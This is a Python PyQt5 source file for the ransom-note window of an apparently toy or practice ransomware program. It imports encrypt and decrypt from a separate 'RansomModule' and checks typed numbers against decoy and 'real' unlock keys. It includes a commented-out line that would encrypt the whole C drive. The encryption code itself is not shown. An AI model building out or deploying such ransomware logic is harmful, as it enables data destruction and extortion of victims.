# -*- coding: utf-8 -*-

# Form implementation generated from reading ui file 'main_window.ui'
#
# Created by: PyQt5 UI code generator 5.10.1
#
# WARNING! All changes made in this file will be lost!

from PyQt5.QtWidgets import *
from PyQt5 import uic
from RansomModule import *
import sys,os

form_class = uic.loadUiType("main_window.ui")[0]
flag = 0
check = 0
class MyWindow(QMainWindow, form_class):
    def __init__(self):
        super().__init__()
        self.setupUi(self)
        self.pushButton.clicked.connect(self.btn_clicked)
        self.lineEdit.returnPressed.connect(self.lineEditInput)

    def lineEditInput(self):
        global flag
        global check
        try:
            if (int(self.lineEdit.text()) >= 160) & (int(self.lineEdit.text()) < 170) :
                flag = 0
                check = 1
                QMessageBox.about(self, "What?", "I will encrypt your C drive")
                #encrypt("C:\\")
            elif int(self.lineEdit.text()) == 173:
                flag = 0
                QMessageBox.about(self, "Fake(grin)", "Fake~~ find out my real key")
            elif int(self.lineEdit.text()) == 187:
                flag = 1
                QMessageBox.about(self, "Great!", "Oh, This is my Real key")
            else:
                flag = 0
                QMessageBox.about(self, "Wrong!", "Wrong!Wrong!")
        except:
            flag = 0
            pass
        finally:
            print("flag :"+str(flag))
            print("check :"+str(check))

    def btn_clicked(self):
        global flag
        global check
        if (flag == 1) & (check == 0):
            decrypt(os.path.dirname(os.path.realpath(__file__)))
            QMessageBox.about(self, "Decrypt", "Finished Decrypt")
        elif (flag == 1) & (check == 1):
            # decrypt("C:\\")
            QMessageBox.about(self, "Decrypt", "Don't say that again")
        else:
            QMessageBox.about(self, "Decrypt", "You can't Decrypt (grin)")

if __name__ == "__main__":
    app = QApplication(sys.argv)
    myWindow = MyWindow()
    myWindow.show()
    app.exec_()
